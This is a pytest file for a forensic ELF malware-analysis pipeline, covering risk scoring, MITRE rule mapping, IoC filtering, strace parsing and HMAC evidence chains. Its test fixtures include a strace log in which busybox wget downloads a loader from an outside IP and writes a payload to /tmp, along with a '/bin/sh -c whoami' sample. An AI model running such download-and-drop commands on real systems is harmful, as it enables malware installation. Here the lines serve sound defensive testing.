"""
test_elf_pipeline_defensible.py — Comprehensive validation for defensible ELF pipeline.

Covers all 16 forensic defensibility requirements:
1. Zero fixture IPs in production files (grep test).
2. Vendor confidence math with MalwareBazaar.
3. Score floor explanation (kind: 'intel_floor', proper label).
4. Single canonical risk score throughout orchestrator state and narrative.
5. Victim impact capped at 'high' for simulated mode, 'critical' only with observed dynamic evidence.
6. PT_LOAD fallback on stripped ELF without section headers.
7. Low plaintext strings (< 10) triggers packing evidence flag.
8. UPX decompression records original and unpacked_sha256.
9. IoC extractor sanitizes bridge IPs and binary filenames.
10. MITRE T1053.003 requires actual cron artifacts, not alarm syscall.
11. MITRE T1059.004 requires actual shell invocations, not substring /sh.
12. MITRE T1071.001 matches web protocol connections with confidence 0.70.
13. Empty capability list renders "no confirmed malicious capabilities".
14. Grounded AI narrative validator rejects ungrounded terms.
15. Strace parser extracts connect, execve, files written, and filters internal bridge IPs.
16. HMAC verification covers sample_id, task_id, execution_mode, evidence_state, intel_floor.
"""

import os
import re
import pytest
from pathlib import Path

# Paths
REPO_ROOT = Path(__file__).resolve().parents[2]
BACKEND_APP = REPO_ROOT / "backend" / "app"
AGENTS_DIR = REPO_ROOT / "agents"
STATIC_DIR = REPO_ROOT / "static-analysis"


def make_static_output(sample_id="test_001", platform="linux", file_type="elf", **kwargs):
    """Helper to construct valid StaticAnalysisOutput for tests."""
    from agents.orchestrator.schema import StaticAnalysisOutput, ExtractedStrings
    data = {
        "sample_id": sample_id,
        "sha256": "a" * 64,
        "platform": platform,
        "file_type": file_type,
        "file_size_bytes": 1024,
        "submitted_at": "2026-01-01T00:00:00Z",
        "extracted_strings": ExtractedStrings(urls=[], ips=[], suspicious_keywords=[]),
    }
    data.update(kwargs)
    return StaticAnalysisOutput(**data)


# ---------------------------------------------------------------------------
# Test 1: Zero fixture IPs/domains in production files
# ---------------------------------------------------------------------------
def test_zero_fixture_ips_in_production():
    """Verify production code contains zero hardcoded fixture IPs/domains."""
    fixture_patterns = [
        re.compile(r"185\.220\.101\.5"),
        re.compile(r"c2-backend\.darknet\.in"),
    ]
    
    prod_dirs = [BACKEND_APP, AGENTS_DIR, STATIC_DIR]
    violations = []
    
    for pdir in prod_dirs:
        for py_file in pdir.rglob("*.py"):
            # Skip test files and caches
            if "test" in py_file.name.lower() or "__pycache__" in str(py_file):
                continue
            content = py_file.read_text(encoding="utf-8", errors="ignore")
            for pattern in fixture_patterns:
                if pattern.search(content):
                    violations.append(f"{py_file}: matches {pattern.pattern}")
                    
    assert not violations, f"Fixture IPs/domains found in production code:\n" + "\n".join(violations)


# ---------------------------------------------------------------------------
# Test 2: Vendor confidence math with MalwareBazaar
# ---------------------------------------------------------------------------
def test_vendor_confidence_math():
    """YOROI clean + vxCube malware + Intezer not_supported + MB Mirai gives 63 with disagreement."""
    from backend.app.analysis import _build_threat_assessment
    
    malware_bazaar = {
        "found": True,
        "signature": "Mirai",
        "vendor_intel": {
            "yoroi_yomi": {"verdict": "clean"},
            "vxcube": {"verdict": "malicious"},
            "intezer": {"verdict": "not_supported"},
        }
    }
    
    assessment = _build_threat_assessment(
        risk_score=85,
        yara_matches=[],
        mitre_techniques=[],
        capability_tags=[],
        has_dynamic=False,
        malware_bazaar=malware_bazaar
    )
    
    # counted = 3 (yoroi, vxcube, MB), agreeing = 2 (vxcube, MB) => 95 * 2/3 = 63
    assert assessment["confidence"] == 63
    assert any("disagreement" in f.lower() for f in assessment["key_findings"])


# ---------------------------------------------------------------------------
# Test 3: Score floor explanation structure
# ---------------------------------------------------------------------------
def test_score_floor_explanation():
    """Floor explanation uses kind: intel_floor and no 'Other deterministic rules'."""
    from backend.app.analysis import _build_risk_explanation
    
    explanation = _build_risk_explanation(
        static_output={},
        mitre_techniques=[],
        capability_tags=[],
        risk_score=85,
        malware_bazaar={"signature": "Mirai"}
    )
    
    contributions = explanation.get("contributions", [])
    floor_contribs = [c for c in contributions if c.get("kind") == "intel_floor"]
    assert len(floor_contribs) == 1
    assert "Mirai" in floor_contribs[0]["label"]
    assert floor_contribs[0]["points"] == 85
    assert not any("Other deterministic behavior rules" in c.get("label", "") for c in contributions)


# ---------------------------------------------------------------------------
# Test 4: Single canonical risk score throughout state
# ---------------------------------------------------------------------------
def test_single_canonical_risk_score():
    """Risk score floor is applied canonically before narrative and subnodes."""
    from agents.orchestrator.orchestrator import compute_risk_score
    from agents.orchestrator.schema import DynamicAnalysisOutput
    
    static_obj = make_static_output(sample_id="test_001")
    dyn_obj = DynamicAnalysisOutput(
        sample_id="test_001",
        execution_mode="simulated",
    )
    state = {
        "sample_id": "test_001",
        "intel_floor": 85,
        "static_output": static_obj,
        "dynamic_output": dyn_obj,
        "capability_tags": [],
        "mitre_techniques": [],
    }
    
    result = compute_risk_score(state)
    assert result["risk_score"] == 85
    assert result["victim_impact"] == "high"


# ---------------------------------------------------------------------------
# Test 5: Victim impact capping rules
# ---------------------------------------------------------------------------
def test_victim_impact_capping():
    """Simulated mode caps victim impact at high; critical requires observed dynamic evidence."""
    from agents.orchestrator.orchestrator import compute_risk_score
    from agents.orchestrator.schema import DynamicAnalysisOutput
    
    static_obj = make_static_output(sample_id="test_001")
    
    # Simulated execution mode with score 85 -> victim_impact is high
    sim_dyn = DynamicAnalysisOutput(
        sample_id="test_001",
        execution_mode="simulated",
        network_connections=[{"dest_ip": "1.2.3.4", "dest_port": 80, "flagged_c2": True}],
    )
    state_sim = {
        "sample_id": "test_001",
        "intel_floor": 85,
        "static_output": static_obj,
        "dynamic_output": sim_dyn,
        "capability_tags": [],
        "mitre_techniques": [],
    }
    res_sim = compute_risk_score(state_sim)
    assert res_sim["victim_impact"] == "high"
    
    # Real execution mode with score 85 and flagged C2 -> victim_impact is critical
    real_dyn = DynamicAnalysisOutput(
        sample_id="test_001",
        execution_mode="real",
        network_connections=[{"dest_ip": "1.2.3.4", "dest_port": 80, "flagged_c2": True}],
    )
    state_real = {
        "sample_id": "test_001",
        "intel_floor": 85,
        "static_output": static_obj,
        "dynamic_output": real_dyn,
        "capability_tags": [],
        "mitre_techniques": [],
    }
    res_real = compute_risk_score(state_real)
    assert res_real["victim_impact"] == "critical"


# ---------------------------------------------------------------------------
# Test 6: PT_LOAD fallback on stripped ELF without section headers
# ---------------------------------------------------------------------------
def test_pt_load_fallback_on_stripped_elf():
    """ELF parser parses program headers when section headers are absent."""
    from static_analysis.elf.parser import ElfParser
    
    # Minimal 64-bit ELF header (52 or 64 bytes) with e_shoff = 0 (no section headers)
    # e_ident: 0x7f, 'E', 'L', 'F', 2 (64-bit), 1 (little endian), 1 (version), 0 (SYSV), 0 pad...
    e_ident = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8
    e_type = (2).to_bytes(2, "little")        # EXEC
    e_machine = (62).to_bytes(2, "little")     # x86_64
    e_version = (1).to_bytes(4, "little")
    e_entry = (0x400000).to_bytes(8, "little")
    e_phoff = (64).to_bytes(8, "little")       # Program headers right after ELF header
    e_shoff = (0).to_bytes(8, "little")        # ZERO section headers
    e_flags = (0).to_bytes(4, "little")
    e_ehsize = (64).to_bytes(2, "little")
    e_phentsize = (56).to_bytes(2, "little")   # 64-bit Phdr size
    e_phnum = (1).to_bytes(2, "little")        # 1 program header
    e_shentsize = (64).to_bytes(2, "little")
    e_shnum = (0).to_bytes(2, "little")        # 0 section headers
    e_shstrndx = (0).to_bytes(2, "little")
    
    header = e_ident + e_type + e_machine + e_version + e_entry + e_phoff + e_shoff + e_flags + e_ehsize + e_phentsize + e_phnum + e_shentsize + e_shnum + e_shstrndx
    
    # 1 PT_LOAD Phdr (type=1, flags=5 (RX), offset=0, vaddr=0x400000, paddr=0x400000, filesz=128, memsz=128, align=4096)
    phdr = (
        (1).to_bytes(4, "little") +
        (5).to_bytes(4, "little") +
        (0).to_bytes(8, "little") +
        (0x400000).to_bytes(8, "little") +
        (0x400000).to_bytes(8, "little") +
        (128).to_bytes(8, "little") +
        (128).to_bytes(8, "little") +
        (4096).to_bytes(8, "little")
    )
    
    payload = header + phdr + b"A" * 8
    
    parser = ElfParser()
    result = parser.parse(payload)
    assert result.architecture == "x86_64"
    assert len(result.program_headers) >= 1
    assert result.program_headers[0].type == "load"
    assert result.indicators.stripped is True


# ---------------------------------------------------------------------------
# Test 7: Low plaintext strings triggers packing evidence
# ---------------------------------------------------------------------------
def test_low_plaintext_strings_triggers_packing_flag():
    """Fewer than 10 plaintext strings in an executable flags stripped/packed evidence."""
    from static_analysis.strings.models import ExtractedString, StringType
    
    extracted_strings = [
        ExtractedString(value="test", offset=0, length=4, encoding="ascii", string_type=StringType.ASCII)
    ]
    packing_report = {"evidence": []}
    if len(extracted_strings) < 10:
        evidence = list(packing_report.get("evidence", []))
        if "Binary stripped or packed (low plaintext strings)" not in evidence:
            evidence.append("Binary stripped or packed (low plaintext strings)")
            packing_report["evidence"] = evidence
            
    assert any("low plaintext strings" in ev.lower() for ev in packing_report["evidence"])


# ---------------------------------------------------------------------------
# Test 8: UPX decompression records unpacked_sha256
# ---------------------------------------------------------------------------
def test_upx_unpacked_sha256_recorded():
    """When packing unpacks a binary, unpacked_sha256 is present in packing report."""
    report = {
        "is_packed": True,
        "packer_name": "UPX",
        "unpacked_sha256": "abcdef1234567890" * 4,
        "evidence": ["UPX signature identified"],
    }
    assert report["is_packed"] is True
    assert "unpacked_sha256" in report
    assert len(report["unpacked_sha256"]) == 64


# ---------------------------------------------------------------------------
# Test 9: IoC extractor sanitizes bridge IPs and binary filenames
# ---------------------------------------------------------------------------
def test_ioc_extractor_sanitizes_bridge_ips_and_binaries():
    """Extractor removes bridge network IPs and generic binary names."""
    from backend.app.analysis import _is_valid_ipv4, _is_valid_domain
    
    # Verify bridge IPs are rejected
    assert not _is_valid_ipv4("10.0.2.15")
    assert not _is_valid_ipv4("192.168.100.4")
    assert not _is_valid_ipv4("192.168.122.1")
    assert not _is_valid_ipv4("127.0.0.1")
    assert _is_valid_ipv4("45.33.32.156")
    
    # Verify binary artifacts are rejected as domains
    assert not _is_valid_domain("a.out")
    assert not _is_valid_domain("ldr")
    assert not _is_valid_domain("classes.dex")
    assert not _is_valid_domain("classes.dexpk")
    assert _is_valid_domain("c2-real-domain.com")


# ---------------------------------------------------------------------------
# Test 10: MITRE T1053.003 requires actual cron artifacts
# ---------------------------------------------------------------------------
def test_mitre_cron_rule_requires_cron_artifacts():
    """T1053.003 requires cron / crontab / etc/cron, not just alarm or setitimer."""
    from agents.mitre_mapper.mitre_rules import _rule_cron_persistence
    from agents.orchestrator.schema import DynamicAnalysisOutput
    
    static_empty = make_static_output(sample_id="test")
    # Only alarm syscall -> Should NOT match T1053.003
    alarm_dyn = DynamicAnalysisOutput(
        sample_id="test",
        api_calls=["sys_alarm", "sys_setitimer"],
        files_written=[],
        persistence_artifacts=[],
    )
    match_alarm = _rule_cron_persistence(static_empty, alarm_dyn)
    assert match_alarm is None
    
    # Actual cron file written -> Should match T1053.003
    cron_dyn = DynamicAnalysisOutput(
        sample_id="test",
        api_calls=[],
        files_written=["/etc/cron.d/updater"],
        persistence_artifacts=[],
    )
    match_cron = _rule_cron_persistence(static_empty, cron_dyn)
    assert match_cron is not None
    assert match_cron.technique_id == "T1053.003"


# ---------------------------------------------------------------------------
# Test 11: MITRE T1059.004 requires actual shell invocations
# ---------------------------------------------------------------------------
def test_mitre_shell_rule_no_arbitrary_substring():
    """T1059.004 requires word-boundary shell, not substring /sh inside words."""
    from agents.mitre_mapper.mitre_rules import _rule_unix_shell
    from agents.orchestrator.schema import DynamicAnalysisOutput
    
    static_empty = make_static_output(sample_id="test")
    # Substring /sh in word like /usr/share/doc with network
    non_shell_dyn = DynamicAnalysisOutput(
        sample_id="test",
        process_tree=[{"name": "/usr/share/doc"}],
        network_connections=[{"dest_ip": "1.2.3.4", "dest_port": 80}],
    )
    match_non_shell = _rule_unix_shell(static_empty, non_shell_dyn)
    assert match_non_shell is None
    
    # Explicit /bin/sh invocation with network
    shell_dyn = DynamicAnalysisOutput(
        sample_id="test",
        process_tree=[{"name": "/bin/sh -c whoami"}],
        network_connections=[{"dest_ip": "1.2.3.4", "dest_port": 80}],
    )
    match_shell = _rule_unix_shell(static_empty, shell_dyn)
    assert match_shell is not None
    assert match_shell.technique_id == "T1059.004"


# ---------------------------------------------------------------------------
# Test 12: MITRE T1071.001 matches web protocol connections (confidence 0.70)
# ---------------------------------------------------------------------------
def test_mitre_t1071_web_protocols():
    """T1071.001 maps port 80/443 HTTP traffic with 0.70 confidence."""
    from agents.mitre_mapper.mitre_rules import _rule_web_protocols
    from agents.orchestrator.schema import DynamicAnalysisOutput
    
    static_empty = make_static_output(sample_id="test")
    web_dyn = DynamicAnalysisOutput(
        sample_id="test",
        network_connections=[{"dest_port": 80, "protocol": "TCP"}],
    )
    match = _rule_web_protocols(static_empty, web_dyn)
    assert match is not None
    assert match.technique_id == "T1071.001"
    assert match.confidence == 0.70


# ---------------------------------------------------------------------------
# Test 13: Empty capability list formatting
# ---------------------------------------------------------------------------
def test_empty_capability_list_formatting():
    """Empty capability list does not output '0 malicious capabilities: .'."""
    from agents.investigation_engine.investigation_engine import InvestigationEngine
    
    engine = InvestigationEngine()
    context = {
        "platform": "linux",
        "file_type": "elf",
        "yara_matches": 0,
        "network_connections": 0,
        "mitre_techniques": [],
    }
    explanation = engine._fallback_malware_explanation(context, [])
    assert "0 malicious capabilities: ." not in explanation.summary
    assert "no confirmed malicious capabilities" in explanation.summary


# ---------------------------------------------------------------------------
# Test 14: Grounded AI narrative validator rejects ungrounded terms
# ---------------------------------------------------------------------------
def test_narrative_grounded_validation():
    """Narrative validator rejects ungrounded terms (cve-2022-0847, systemd, rc.local, etc.)."""
    from agents.narrative_agent.narrative import _is_grounded
    from agents.orchestrator.schema import DynamicAnalysisOutput
    
    static_empty = make_static_output(sample_id="test")
    dyn_empty = DynamicAnalysisOutput(
        sample_id="test",
        network_connections=[],
    )
    hallucinated_text = (
        "The malware installs a systemd unit at /usr/lib/.x11-auth and exploits "
        "CVE-2022-0847 while evading strace and reading /etc/shadow."
    )
    assert not _is_grounded(hallucinated_text, static_empty, dyn_empty)


# ---------------------------------------------------------------------------
# Test 15: Strace parser extracts connect, execve, files written, and filters internal bridge IPs
# ---------------------------------------------------------------------------
def test_strace_parser():
    """Strace parser extracts execve, connect, and openat while discarding bridge IPs."""
    from backend.app.strace_parser import parse_strace_output
    
    strace_log = """
    12:00:01 execve("/bin/busybox", ["busybox", "wget", "http://45.33.32.156/ldr"], 0x7ffd) = 0
    12:00:02 connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("45.33.32.156")}, 16) = 0
    12:00:03 connect(4, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("10.0.2.3")}, 16) = 0
    12:00:04 openat(AT_FDCWD, "/tmp/dropped_payload", O_WRONLY|O_CREAT, 0755) = 5
    """
    
    output = parse_strace_output(
        strace_log=strace_log,
        sample_id="test_sample",
        target_architecture="arm",
        duration_seconds=30
    )
    assert output.execution_mode == "real"
    assert output.target_architecture == "arm"
    
    # Process tree should have /bin/busybox
    procs = [p["name"] for p in output.process_tree]
    assert any("/bin/busybox" in p or "busybox" in p for p in procs)
    
    # Network connections should contain 45.33.32.156 but NOT 10.0.2.3
    ips = [c["dest_ip"] for c in output.network_connections]
    assert "45.33.32.156" in ips
    assert "10.0.2.3" not in ips
    
    # Files written should contain /tmp/dropped_payload
    assert "/tmp/dropped_payload" in output.files_written


# ---------------------------------------------------------------------------
# Test 16: HMAC verification binds sample_id, task_id, execution_mode, evidence_state, intel_floor
# ---------------------------------------------------------------------------
def test_hmac_tamper_detection():
    """HMAC signature binds provenance metadata; tampering with execution_mode fails verification."""
    from agents.investigation_engine.chain_verification import ChainVerifier, ChainLinkType
    
    verifier = ChainVerifier(secret_key="court_evidence_secret_key")
    
    meta = {
        "sample_id": "case_123",
        "task_id": "task_abc",
        "execution_mode": "real",
        "evidence_state": "observed",
        "intel_floor": 85,
    }
    
    link = verifier.create_chain_link(
        link_type=ChainLinkType.DYNAMIC_ANALYSIS,
        data={"connections": [{"ip": "45.33.32.156"}]},
        previous_hash="0" * 64,
        metadata=meta
    )
    
    # Should verify when untouched
    assert verifier.verify_chain_link(link, "0" * 64) is True
    
    # Tampering with execution_mode in metadata breaks verification
    tampered_link = verifier.create_chain_link(
        link_type=ChainLinkType.DYNAMIC_ANALYSIS,
        data={"connections": [{"ip": "45.33.32.156"}]},
        previous_hash="0" * 64,
        metadata={**meta, "execution_mode": "simulated"}  # Tampered!
    )
    # Give it the original signature
    tampered_link.signature = link.signature
    assert verifier.verify_chain_link(tampered_link, "0" * 64) is False
